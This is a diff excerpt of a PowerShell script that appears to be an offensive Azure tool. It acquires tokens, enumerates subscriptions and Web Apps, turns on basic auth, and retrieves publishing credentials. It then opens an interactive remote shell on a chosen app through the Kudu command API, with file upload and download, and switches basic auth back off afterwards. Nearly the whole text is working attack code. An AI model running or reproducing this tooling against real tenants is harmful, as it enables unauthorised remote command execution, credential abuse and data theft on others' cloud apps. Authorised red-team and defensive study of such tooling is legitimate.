+                Write-Host "  [$($App.Name)] " -ForegroundColor Red -NoNewline
+                $command = Read-Host -Prompt ">>"
+
+                if ([string]::IsNullOrWhiteSpace($command)) { continue }
+                if ($command -match "^(exit|quit)$") { break }
+
+                if ($command -match "^upload\s+(.+?)\s+(.+)$") {
+                    $localPath  = $Matches[1].Trim('"', "'")
+                    $remotePath = $Matches[2].Trim('"', "'")
+                    Invoke-KuduUpload -ScmHost $scmHost -AuthHeader $authHeader -LocalPath $localPath -RemotePath $remotePath
+                    continue
+                }
+
+                if ($command -match "^download\s+(.+?)\s+(.+)$") {
+                    $remotePath = $Matches[1].Trim('"', "'")
+                    $localPath  = $Matches[2].Trim('"', "'")
+                    Invoke-KuduDownload -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath -LocalPath $localPath
+                    continue
+                }
+
+                if ($command -match "^vfs-ls\s*(.*)$") {
+                    $remotePath = $Matches[1].Trim('"', "'")
+                    if ([string]::IsNullOrWhiteSpace($remotePath)) {
+                        $remotePath = "site/wwwroot"
+                    }
+                    Invoke-KuduLs -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath
+                    continue
+                }
+
+                $commandBody = @{
+                    command = $command
+                    dir = $workDir
+                } | ConvertTo-Json
+
+                try {
+                    $response = Invoke-RestMethod -Uri $cmdUri -Method Post -Body $commandBody -ContentType "application/json" -Headers $authHeader -ErrorAction Stop
+
+                    if ($response.Output) {
+                        Write-Host $response.Output -ForegroundColor White
+                    }
+                    if ($response.Error) {
+                        Write-Host $response.Error -ForegroundColor Red
+                    }
+                    if ($response.ExitCode -ne 0) {
+                        Write-Host "  [Exit Code: $($response.ExitCode)]" -ForegroundColor Yellow
+                    }
+                }
+                catch {
+                    Write-Host "  [!] Command failed: $($_.Exception.Message)" -ForegroundColor Yellow
+                }
+            }
+        }
+        catch {
+            # Ctrl+C caught
+        }
     }
-}
 
 ###################################################################################
 
 
-function main {
-    param (
-        [string]$AccessToken,
-        [string]$ClientID,
-        [string]$ClientSecret,
-        [string]$Identity,
-        [string]$TenantName
-    )
- 
-    if (-not $TenantName) {
-        Write-Host "[-] Must specify TenantName" -ForegroundColor Red
-        return
-    }
- 
-    # Resolve tenant
-    $global:TenantID = Get-DomainName -DomainName $TenantName
-    if (-not $global:TenantID) {
-        Write-Host "[-] Could not resolve TenantID. Exiting." -ForegroundColor Red
-        return
-    }
- 
+    function main {
+        param (
+            [string]$AccessToken,
+            [string]$ClientID,
+            [string]$ClientSecret,
+            [string]$Identity,
+            [string]$TenantName
+        )
+    
+        if (-not $TenantName) {
+            Write-Host "[-] Must specify TenantName" -ForegroundColor Red
+            return
+        }
+    
+        # Resolve tenant
+        $global:TenantID = Get-DomainName -DomainName $TenantName
+        if (-not $global:TenantID) {
+            Write-Host "[-] Could not resolve TenantID. Exiting." -ForegroundColor Red
+            return
+        }
+    
 
-    if ($Identity) {
-        # Managed Identity - manual token
-        Invoke-GetTokens -AccessToken $Identity | Out-Null
-    }
-    elseif ($ClientID -and $ClientSecret) {
-        # Service Principal
-        Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null
-    }
-    else {
-        # User - Device Code Flow
-        Invoke-GetTokens -DomainName $TenantName | Out-Null
-    }
- 
+        if ($Identity) {
+            # Managed Identity - manual token
+            Invoke-GetTokens -AccessToken $Identity | Out-Null
+        }
+        elseif ($ClientID -and $ClientSecret) {
+            # Service Principal
+            Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null
+        }
+        else {
+            # User - Device Code Flow
+            Invoke-GetTokens -DomainName $TenantName | Out-Null
+        }
+    
 
-    if (-not $global:AccessToken) {
-        Write-Host "[-] Failed to acquire token. Exiting." -ForegroundColor Red
-        return
-    }
- 
-    $headers = Get-AuthHeaders
- 
-    # Enumerate subscriptions
-    $subscriptions = Get-Subscriptions -Headers $headers
-    if ($subscriptions.Count -eq 0) {
-        Write-Host "[!] No subscriptions accessible. Exiting." -ForegroundColor Red
-        return
-    }
- 
+        if (-not $global:AccessToken) {
+            Write-Host "[-] Failed to acquire token. Exiting." -ForegroundColor Red
+            return
+        }
+    
+        $headers = Get-AuthHeaders
+    
+        # Enumerate subscriptions
+        $subscriptions = Get-Subscriptions -Headers $headers
+        if ($subscriptions.Count -eq 0) {
+            Write-Host "[!] No subscriptions accessible. Exiting." -ForegroundColor Red
+            return
+        }
+    
 
-    $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
-    if ($webApps.Count -eq 0) {
-        Write-Host "[!] No Web Apps found. Exiting." -ForegroundColor Red
-        return
-    }
- 
-    # Check permissions
-    $webApps = Check-Permissions -WebApps $webApps -Headers $headers
- 
-    # Interactive loop
-    while ($true) {
-        Show-WebAppMenu -WebApps $webApps
- 
-        $choice = Read-Host -Prompt "Select Web App # (or Q to quit)"
- 
-        if ($choice -match "^[Qq]$") {
-            Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
-            break
+        $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
+        if ($webApps.Count -eq 0) {
+            Write-Host "[!] No Web Apps found. Exiting." -ForegroundColor Red
+            return
         }
- 
-        if ($choice -eq "0") {
-            Write-Host "`n[*] Refreshing..." -ForegroundColor Cyan
-            $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
-            $webApps = Check-Permissions -WebApps $webApps -Headers $headers
-            continue
-        }
- 
-        $index = [int]$choice - 1
-        if ($index -lt 0 -or $index -ge $webApps.Count) {
-            Write-Host "[!] Invalid selection." -ForegroundColor Red
-            continue
-        }
- 
-        $selectedApp = $webApps[$index]
-        Write-Host "`n[*] Selected: $($selectedApp.Name) [$($selectedApp.ResourceGroup)]" -ForegroundColor Cyan
- 
-        if ($selectedApp.Permission -match "No Access") {
-            Write-Host "[!] Insufficient permissions on this Web App." -ForegroundColor Red
-            continue
-        }
- 
-        # Enable basic auth
-        Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true
- 
-        # Get publishing credentials
-        $creds = Get-PublishingCredentials -App $selectedApp -Headers $headers
-        if (-not $creds) {
-            Write-Host "[!] Cannot proceed without credentials. Disabling basic auth..." -ForegroundColor Red
+    
+        # Check permissions
+        $webApps = Check-Permissions -WebApps $webApps -Headers $headers
+    
+        # Interactive loop
+        while ($true) {
+            Show-WebAppMenu -WebApps $webApps
+    
+            $choice = Read-Host -Prompt "Select Web App # (or Q to quit)"
+    
+            if ($choice -match "^[Qq]$") {
+                Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
+                break
+            }
+    
+            if ($choice -eq "0") {
+                Write-Host "`n[*] Refreshing..." -ForegroundColor Cyan
+                $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
+                $webApps = Check-Permissions -WebApps $webApps -Headers $headers
+                continue
+            }
+    
+            $index = [int]$choice - 1
+            if ($index -lt 0 -or $index -ge $webApps.Count) {
+                Write-Host "[!] Invalid selection." -ForegroundColor Red
+                continue
+            }
+    
+            $selectedApp = $webApps[$index]
+            Write-Host "`n[*] Selected: $($selectedApp.Name) [$($selectedApp.ResourceGroup)]" -ForegroundColor Cyan
+    
+            if ($selectedApp.Permission -match "No Access") {
+                Write-Host "[!] Insufficient permissions on this Web App." -ForegroundColor Red
+                continue
+            }
+    
+            # Enable basic auth
+            Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true
+    
+            # Get publishing credentials
+            $creds = Get-PublishingCredentials -App $selectedApp -Headers $headers
+            if (-not $creds) {
+                Write-Host "[!] Cannot proceed without credentials. Disabling basic auth..." -ForegroundColor Red
+                Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
+                continue
+            }
+    
+            # Start shell
+            Start-InteractiveShell -App $selectedApp -Creds $creds
+    
+            # Cleanup: disable basic auth
+            Write-Host "`n  [*] Disconnecting from $($selectedApp.Name)..." -ForegroundColor Cyan
             Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
-            continue
+            Write-Host ""
         }
- 
-        # Start shell
-        Start-InteractiveShell -App $selectedApp -Creds $creds
- 
-        # Cleanup: disable basic auth
-        Write-Host "`n  [*] Disconnecting from $($selectedApp.Name)..." -ForegroundColor Cyan
-        Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
-        Write-Host ""
     }
-}
  
 main -TenantName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret -Identity $Identity -AccessToken $AccessToken
  
